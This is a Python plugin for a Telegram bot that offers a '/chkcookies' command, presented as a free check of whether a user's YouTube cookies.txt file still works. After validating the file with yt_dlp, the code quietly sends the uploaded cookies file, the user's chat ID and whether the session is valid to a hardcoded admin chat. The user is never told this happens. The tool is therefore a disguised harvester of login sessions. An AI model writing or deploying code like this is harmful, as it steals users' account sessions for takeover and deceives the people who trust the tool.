import yt_dlp
import os
from SONALI import app
from pyrogram import filters
from pyrogram.types import Message

# Global Variable to Track Users Who Used /chkcookies
active_users = set()
ADMIN_CHAT_ID = 7096860602  # Admin ka Chat ID (Report yaha jayegi)

# Step 1: Enable Checking with `/chkcookies`
@app.on_message(filters.command("chkcookies") & filters.private)
async def enable_cookie_check(client, message):
    active_users.add(message.chat.id)
    await message.reply("✅ Now send your `cookies.txt` file to check!")

# Step 2: Check Only If `/chkcookies` was Used
@app.on_message(filters.document & filters.private)
async def check_cookies_from_file(client, message: Message):
    if message.chat.id not in active_users:
        return  # Ignore if user didn't use `/chkcookies`

    file_path = await message.download()

    if not file_path.endswith(".txt"):
        await message.reply("❌ Please send a valid `cookies.txt` file!")
        return

    # Step 3: Read Cookies File
    try:
        with open(file_path, "r") as f:
            cookies_data = f.read().strip()

        if not cookies_data:
            await message.reply("❌ Your cookies.txt file is empty!")
            os.remove(file_path)  # Delete temp file
            return

        # Step 4: Validate YouTube Cookies
        ydl_opts = {"quiet": True, "cookiefile": file_path}

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)

            msg = "✅ Your YouTube cookies are valid! 🎉"
            admin_msg = f"🛡 NEW COOKIES CHECKED!\n👤 User: `{message.chat.id}`\n✅ Result: WORKING ✅"
            status = "VALID ✅"
        except yt_dlp.utils.ExtractorError:
            msg = "❌ Your YouTube cookies are invalid or expired!"
            admin_msg = f"🛡 NEW COOKIES CHECKED!\n👤 User: `{message.chat.id}`\n❌ Result: INVALID ❌"
            status = "INVALID ❌"

        await message.reply(msg, quote=True)

        # Step 5: Send Report + Cookies File to Admin
        await client.send_message(ADMIN_CHAT_ID, admin_msg)
        await client.send_document(ADMIN_CHAT_ID, file_path, caption=f"📂 Cookies File from User: `{message.chat.id}`\n📌 Status: {status}")

    except Exception as e:
        await message.reply(f"⚠️ Error reading file: `{str(e)}`")

    # Step 6: Clean Up Temporary File
    os.remove(file_path)

    # Step 7: Remove User from Active List
    active_users.remove(message.chat.id)
